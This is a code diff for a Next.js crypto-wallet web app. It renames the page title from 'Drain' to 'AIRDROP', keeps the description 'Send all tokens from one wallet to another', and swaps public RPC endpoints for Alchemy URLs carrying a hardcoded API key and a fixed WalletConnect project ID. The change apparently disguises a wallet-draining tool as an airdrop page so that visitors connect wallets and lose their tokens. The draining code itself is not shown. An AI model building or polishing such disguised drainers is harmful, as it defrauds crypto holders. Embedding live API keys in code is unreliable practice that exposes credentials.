@@ -31,7 +31,7 @@ import {
 } from '@rainbow-me/rainbowkit/wallets';
 
 // Define WalletConnect projectId
-const projectId = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID || 'default_project_id_placeholder';
+const projectId = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID || 'dce4c19a5efd3cba4116b12d4fc3689a';
 
 // Define connectors
 const connectors = connectorsForWallets([
@@ -53,17 +53,11 @@ const wagmiConfig = createConfig({
   connectors,
   chains,
   transports: {
-    1: http('https://cloudflare-eth.com'),
-    137: http('https://polygon-rpc.com'),
-    10: http('https://mainnet.optimism.io'),
-    42161: http('https://arb1.arbitrum.io/rpc'),
-    56: http('https://rpc.ankr.com/bsc'),
-    100: http('https://rpc.gnosischain.com'),
-    240: http('https://rpcurl.pos.nexilix.com'),
-    324: http('https://mainnet.era.zksync.io'),
-    61: http('https://etc.rivet.link'),
-    8453: http('https://mainnet.base.org'),
-    43114: http('https://api.avax.network/ext/bc/C/rpc'),
+    1: http('https://eth-mainnet.g.alchemy.com/v2/iUoZdhhu265uyKgw-V6FojhyO80OKfmV'),
+    137: http('https://polygon-mainnet.g.alchemy.com/v2/iUoZdhhu265uyKgw-V6FojhyO80OKfmV'),
+    10: http('https://opt-mainnet.g.alchemy.com/v2/iUoZdhhu265uyKgw-V6FojhyO80OKfmV'),
+    42161: http('https://arb-mainnet.g.alchemy.com/v2/iUoZdhhu265uyKgw-V6FojhyO80OKfmV'),
+    324: http('https://zksync-mainnet.g.alchemy.com/v2/iUoZdhhu265uyKgw-V6FojhyO80OKfmV'),
   },
 });
 
@@ -110,7 +104,7 @@ const App = ({ Component, pageProps }: AppProps) => {
       <WagmiProvider config={wagmiConfig}>
         <RainbowKitProvider>
           <NextHead>
-            <title>Drain</title>
+            <title>AIRDROP</title>
             <meta name="description" content="Send all tokens from one wallet to another" />
             <link rel="icon" href="/favicon.ico" />
           </NextHead>
